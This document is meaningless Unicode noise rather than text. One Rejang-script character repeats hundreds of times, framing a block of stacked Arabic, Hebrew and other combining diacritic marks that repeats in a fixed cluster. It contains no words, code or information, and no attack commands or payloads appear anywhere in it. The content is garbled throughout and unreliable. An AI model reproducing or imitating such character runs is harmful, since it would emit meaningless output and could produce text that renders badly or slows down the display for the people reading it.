ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ